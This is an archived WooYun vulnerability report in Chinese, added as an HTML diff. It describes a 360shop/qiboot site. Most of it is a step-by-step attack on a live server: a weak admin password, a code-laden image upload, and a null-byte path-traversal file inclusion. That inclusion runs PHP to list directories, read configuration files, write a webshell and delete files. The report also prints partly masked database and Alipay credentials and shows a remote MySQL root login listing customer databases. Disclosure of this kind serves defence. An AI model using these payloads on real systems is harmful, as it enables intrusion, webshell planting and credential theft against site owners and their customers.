@@ -1,0 +1,518 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360shop文件包含漏洞发生的一场血案可导致服务器沦陷  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360shop文件包含漏洞发生的一场血案可导致服务器沦陷  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/秋风">秋风</a> 
+</li><li>提交时间：		2014-01-06 17:04</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-11：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">0#文件包含漏洞（空字符注入类型）常规打法一般都是包含各类log文件。这次利用时发现找不到一个有用的log文件。。。。。。于是乎放了几天，没继续测了！<br />
+1#一晚做梦时，梦到我用PHP include了一个用户头像，哇咔咔，醒来后果断寻找有图片上传的地方。到前台注册用户后，发现尼玛没有一个可以上传图片的地方！去后台瞅瞅？俺就不信后台没提供上传图片。。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#0信息收集<br />
+<br />
+www.qiboot.com<br />
+<br />
+www.360shop.com.cn<br />
+<br />
+这俩域名所属同一ip，暂且猜测服务脚本也在同一台机器上！<br />
+<br />
+<br />
+<br />
+</p><pre><code>qiufeng@ubuntu:/tmp$ ping www.qiboot.com<br />
+PING www.qiboot.com (202.75.216.198) 56(84) bytes of data.<br />
+64 bytes from 202.75.216.198: icmp_req=1 ttl=50 time=8.17 ms<br />
+...<br />
+qiufeng@ubuntu:/tmp$ ping www.360shop.com.cn<br />
+PING www.360shop.com.cn (202.75.216.198) 56(84) bytes of data.<br />
+64 bytes from 202.75.216.198: icmp_req=1 ttl=50 time=12.9 ms<br />
+...</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+泄露绝对路径<br />
+<br />
+</p><pre><code>Warning: preg_match() [function.preg-match]: Unknown modifier &#039;.&#039; in /bootqi/apache2/htdocs/vhost/company/qiboot/header.php on line 98</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/06163133604d5f872183be4748aae9a3dc4dc965.png" target="_blank"><img src="../images/06163133604d5f872183be4748aae9a3dc4dc965.png" alt=".png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+泄露用户名密码（进后台主要为了上传带特定码的图片，为后面攻击做铺垫）<br />
+<br />
+</p><pre><code>http://www.qiboot.com/admin/login.php<br />
+username: demohu@gmail.com<br />
+password: 43******31</code></pre><p class='detail'><br />
+<br />
+弱密码。。。。是病，得治！<br />
+<br />
+</p><p class="detail"><a href="../images/061636155d588f7b596688e1cc9d90be0c48e6ad.png" target="_blank"><img src="../images/061636155d588f7b596688e1cc9d90be0c48e6ad.png" alt=".png" width="600"/></a></p><p class="detail"><br />
+<br />
+可控图片相对路径(1388986954为动态，上传图片后可获得)<br />
+<br />
+http://www.qiboot.com/upload/linkimg/1388986954.jpg<br />
+<br />
+得到相对路径&quot;upload/linkimg/1388986954.jpg&quot;<br />
+<br />
+</p><p class="detail"><a href="../images/06164828b0cf51f8999abecd063bded6bcc3460a.png" target="_blank"><img src="../images/06164828b0cf51f8999abecd063bded6bcc3460a.png" alt=".png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+#0拿泄露的绝对路径信息进行猜测得图片绝对路径如下:<br />
+<br />
+/bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg<br />
+<br />
+<br />
+<br />
+访问该地址，有乱码数据返回则正常<br />
+<br />
+</p><pre><code>http://www.qiboot.com/?mod=product&amp;do=../../../../../../../../../../bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg%00</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/06163237e0055ebe1dd41d5db3a688cfb33e7726.png" target="_blank"><img src="../images/06163237e0055ebe1dd41d5db3a688cfb33e7726.png" alt=".png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+#1打印目录及文件，可修改参数d的值扫描整站<br />
+<br />
+</p><pre><code>www.qiboot.com/?mod=product&amp;do=../../../../../../../../bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg%00&amp;wooyun=print_r(@scandir($_GET[d]));&amp;d=/bootqi/apache2/htdocs/vhost/company<br />
+<br />
+&gt;&gt;/bootqi/apache2/htdocs/vhost/company目录文件打印结果<br />
+Array<br />
+(<br />
+    [0] =&gt; .<br />
+    [1] =&gt; ..<br />
+    [2] =&gt; crm<br />
+    [3] =&gt; fushi<br />
+    [4] =&gt; help<br />
+    [5] =&gt; help_hicloud<br />
+    [6] =&gt; help_hicloud.zip<br />
+    [7] =&gt; help_tltw<br />
+    [8] =&gt; help_tltw.zip<br />
+    [9] =&gt; hotel<br />
+    [10] =&gt; lyf<br />
+    [11] =&gt; newcom<br />
+    [12] =&gt; newcom20130326.zip<br />
+    [13] =&gt; newshop<br />
+    [14] =&gt; qiboot<br />
+    [15] =&gt; zuanshi<br />
+)<br />
+下面这个目测是给客户部署的服务<br />
+http://www.qiboot.com/?mod=product&amp;do=../../../../../../../../bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg%00&amp;wooyun=print_r(@scandir($_GET[d]));&amp;d=/bootqi/apache2/htdocs/vhost/vhostsite<br />
+<br />
+&gt;&gt;/bootqi/apache2/htdocs/vhost/vhostsite目录文件打印结果<br />
+Array<br />
+(<br />
+    [0] =&gt; .<br />
+    [1] =&gt; ..<br />
+    [2] =&gt; 171688.cn<br />
+    [3] =&gt; badbuildfs<br />
+    [4] =&gt; bugfree<br />
+    [5] =&gt; company<br />
+    [6] =&gt; domain<br />
+    [7] =&gt; faq<br />
+    [8] =&gt; grep.txt<br />
+    [9] =&gt; helpcenter<br />
+    [10] =&gt; hotel_<br />
+    [11] =&gt; kehu<br />
+    [12] =&gt; lyf<br />
+    [13] =&gt; netdesk<br />
+    [14] =&gt; newcom<br />
+    [15] =&gt; newcom__2012-02<br />
+    [16] =&gt; pagenotfind<br />
+    [17] =&gt; qcom<br />
+    [18] =&gt; qiboot<br />
+    [19] =&gt; taodiantong<br />
+    [20] =&gt; wddl.cn<br />
+    [21] =&gt; zjtggroup<br />
+    [22] =&gt; zjtggroup_20120619<br />
+    [23] =&gt; zjtggroup_temp<br />
+)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+#2查看文件，可修改参数d的值查看整站文件<br />
+<br />
+</p><pre><code>www.qiboot.com/?mod=product&amp;do=../../../../../../../../bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg%00&amp;wooyun=print_r(@file_get_contents($_GET[d]));&amp;d=/bootqi/apache2/htdocs/vhost/company/newshop/conf/config.php<br />
+<br />
+<br />
+获取文件信息如下:<br />
+&lt;?php<br />
+<br />
+if ( !defined(&#039;IN_EB&#039;) )<br />
+{<br />
+	die(&quot;Hacking attempt&quot;);<br />
+}<br />
+<br />
+if (PHP_OS == &#039;WINNT&#039;)<br />
+{<br />
+	/**<br />
+	 * 数据库主机<br />
+	 */<br />
+	$dbhost = &#039;localhost&#039;;<br />
+	$dbport = &#039;3306&#039;;<br />
+	$dbuser = &quot;root&quot;;<br />
+	$dbpass = &quot;&quot;;<br />
+	$dbname = &quot;360_newshop&quot;;<br />
+	$table_prefix = &quot;eb_&quot;;<br />
+	$dbtype = &quot;mysql4&quot;;<br />
+	$acm_type = &#039;file&#039;;<br />
+	<br />
+	<br />
+	/**<br />
+	 * 远程配置<br />
+	 */<br />
+	$az_prefix = &#039;eb&#039;;<br />
+	$az_dbhost = &#039;localhost&#039;;<br />
+	$az_dbuser = &#039;root&#039;;<br />
+	$az_dbpass = &#039;&#039;;<br />
+	$az_dbname = &#039;abc_appaz&#039;;<br />
+	#$az_install = &#039;http://appaz.test.com/install.php&#039;;<br />
+	#$az_domain = &#039;http://appaz.test.com&#039;;<br />
+	$az_install = &#039;http://qudao.v2.taodiantong.cn/install.php&#039;;<br />
+	$az_domain = &#039;http://qudao.v2.taodiantong.cn/install.php&#039;;<br />
+}<br />
+else<br />
+{<br />
+	<br />
+	/**<br />
+	 * 数据库主机<br />
+	 */<br />
+	$dbhost = &#039;localhost&#039;;<br />
+	$dbport = &#039;3306&#039;;<br />
+	$dbuser = &quot;root&quot;;<br />
+	$dbpass = &quot;qi************hop&quot;;<br />
+	$dbname = &quot;360_ncom&quot;;<br />
+	$table_prefix = &quot;eb_&quot;;<br />
+	$dbtype = &quot;mysql4&quot;;<br />
+	$acm_type = &#039;file&#039;;<br />
+	<br />
+	<br />
+	/**<br />
+	 * 远程配置<br />
+	 */<br />
+	$az_prefix = &#039;eb&#039;;<br />
+	$az_dbhost = &#039;122.224.72.216&#039;;<br />
+	$az_dbuser = &#039;az*****ll&#039;;<br />
+	$az_dbpass = &#039;az2**********c871K&#039;;<br />
+	$az_dbname = &#039;abc_appaz&#039;;<br />
+	#$az_install = &#039;http://qudao.taodiantong.cn/install.php&#039;;<br />
+	$az_install = &#039;http://qudao.v2.taodiantong.cn/install.php&#039;;<br />
+	$az_domain = &#039;http://fuwu.taodiantong.cn&#039;;<br />
+	<br />
+	<br />
+}<br />
+<br />
+<br />
+$pay_config = array(<br />
+&#039;alipay_key&#039; 	=&gt; &#039;zrbh**********16alsto5&#039;,<br />
+&#039;alipay_partner&#039;=&gt; &#039;2088*******250&#039;,<br />
+&#039;alipay_account&#039;=&gt; &#039;alipay@360eb.com&#039;<br />
+);<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/06163516e679d6c4b3a34bdf978b5e4ab58f7958.png" target="_blank"><img src="../images/06163516e679d6c4b3a34bdf978b5e4ab58f7958.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+#3写入传说中的webshell,参数d为内容,n为文件名<br />
+<br />
+</p><pre><code>利用：<br />
+www.qiboot.com/?mod=product&amp;do=../../../../../../../../bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg%00&amp;wooyun=file_put_contents(@$_GET[n],@$_GET[d]);&amp;d=by:wooyun.org&amp;n=/bootqi/apache2/htdocs/vhost/company/newshop/wooyun.org.php<br />
+<br />
+<br />
+对应文件地址：<br />
+http://www.360shop.com.cn/wooyun.org.txt</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/061635321f5345c878353b285ed67eb8d1035662.png" target="_blank"><img src="../images/061635321f5345c878353b285ed67eb8d1035662.png" alt="webshell.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+#4删除文件，参数n为文件名<br />
+<br />
+</p><pre><code>www.qiboot.com/?mod=product&amp;do=../../../../../../../../bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg%00&amp;wooyun=unlink(@$_GET[n]);&amp;n=/bootqi/apache2/htdocs/vhost/company/newshop/wooyun.org.txt</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+测试下#2所泄露的mysql用户root能否登陆，不测本地，测远程！发现居然没禁止远程登陆。。。。。。坚决不脫裤子！<br />
+<br />
+</p><pre><code>qiufeng@ubuntu:/tmp$ nmap 202.75.216.198 -p 3306<br />
+<br />
+Starting Nmap 6.00 ( http://nmap.org ) at 2014-01-06 15:02 CST<br />
+Nmap scan report for 202.75.216.198<br />
+Host is up (0.0081s latency).<br />
+PORT     STATE SERVICE<br />
+3306/tcp open  mysql<br />
+<br />
+Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds<br />
+qiufeng@ubuntu:/tmp$ mysql -h 202.75.216.198 -uroot -p<br />
+Enter password: <br />
+Welcome to the MySQL monitor.  Commands end with ; or \g.<br />
+Your MySQL connection id is 1218931<br />
+Server version: 5.0.95 Source distribution<br />
+<br />
+Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.<br />
+<br />
+Oracle is a registered trademark of Oracle Corporation and/or its<br />
+affiliates. Other names may be trademarks of their respective<br />
+owners.<br />
+<br />
+Type &#039;help;&#039; or &#039;\h&#039; for help. Type &#039;\c&#039; to clear the current input statement.<br />
+<br />
+mysql&gt; show databases;<br />
++------------------------------+<br />
+| Database                     |<br />
++------------------------------+<br />
+| information_schema           |<br />
+| 360_89lou                    |<br />
+| 360_89lou_0818               |<br />
+| 360_canglong                 |<br />
+| 360_canglong_0927            |<br />
+| 360_canglong_1104            |<br />
+| 360_canglong_1112            |<br />
+| 360_crm                      |<br />
+| 360_help                     |<br />
+| 360_help_hicloud             |<br />
+| 360_help_tltw                |<br />
+| 360_hotel                    |<br />
+| 360_ncom                     |<br />
+| 360_newshop                  |<br />
+| 360_qiboot                   |<br />
+| 360_tcrm                     |<br />
+| 360_www_bandao_com           |<br />
+| 3800_www_tomatoc_com         |<br />
+| 51_ml                        |<br />
+| 8800_www_mylianmei_com       |<br />
+| 8800_www_onespacetwofoot_com |<br />
+| 8800_www_yibuerzu_com        |<br />
+| a_men_discuz                 |<br />
+| a_myzs                       |<br />
+| a_myzs_20120401              |<br />
+| a_sanude                     |<br />
+| a_skpifa_wordpress           |<br />
+| a_tltest                     |<br />
+| abc_appaz                    |<br />
+| abc_appaz_0613               |<br />
+| abc_appaz_20111031           |<br />
+| abc_appaz_fx                 |<br />
+| abc_lsa                      |<br />
+| abc_taodiantong              |<br />
+| ali_glsp8_com                |<br />
+| ali_goucoo_com               |<br />
+| ali_shuinianhua_com          |<br />
+| aliefday_360shop_cc          |<br />
+| alihanxianzi_360shop_cc      |<br />
+| alilgg360_360shop_cc         |<br />
+| app_01008034                 |<br />
+| app_02263                    |<br />
+| app_02632                    |<br />
+| app_02633                    |<br />
+| app_02634                    |<br />
+| app_02635                    |<br />
+| app_0618                     |<br />
+| app_1301                     |<br />
+| app_1307525362               |<br />
+| app_2370                     |<br />
+| app_2371                     |<br />
+| app_2447                     |<br />
+| app_2449                     |<br />
+| app_3803                     |<br />
+| app_4370                     |<br />
+| app_5163                     |<br />
+| app_6395                     |<br />
+| app_7287                     |<br />
+| app_8298                     |<br />
+| app_9954                     |<br />
+| app_9954_20120829            |<br />
+| badbuildfs                   |<br />
+| bugfree2                     |<br />
+| bz_meimeivip_com             |<br />
+| bzelf520_360shop_cc          |<br />
+| bzmagic_szjieli_com          |<br />
+| bzmimidf_360shop_cc          |<br />
+| daohang_171688_cn            |<br />
+| daohang_wddl_cn              |<br />
+| mysql                        |<br />
+| netdesk                      |<br />
+| son1308030959                |<br />
+| son1318995965                |<br />
+| son2633                      |<br />
+| son2634                      |<br />
+| son2638                      |<br />
+| v2_lovelens_com              |<br />
+| v2_mingdi_net                |<br />
+| v2powerfeel_360shop_cc       |<br />
+| v2soso2099_360shop_cc        |<br />
+| v2xinyi521_360shop_cc        |<br />
+| www_myvip8_com               |<br />
+| www_yibuerzu_com             |<br />
+| zjtggroup                    |<br />
+| zjtggroup_0619               |<br />
++------------------------------+<br />
+85 rows in set (0.01 sec)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+被偷梁换柱的图片文件绝对地址：/bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg<br />
+<br />
+请厂商自行删除||替换<br />
+<br />
+<br />
+<br />
+声明：测试所写入的文件本人已删除，建议扫描一下整站。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/06163735b42cd05e245611c356ef33ec62d20dc7.png" target="_blank"><img src="../images/06163735b42cd05e245611c356ef33ec62d20dc7.png" alt="webshell.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.过滤<br />
+<br />
+2.mysql建议只对内网开放<br />
+<br />
+3.全站审查<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/秋风" title="秋风">秋风</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048045" title="360shop文件包含漏洞发生的一场血案可导致服务器沦陷">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2014-01-06 17:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：20 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2014-01-13：谢谢，马上就治！</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48045";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
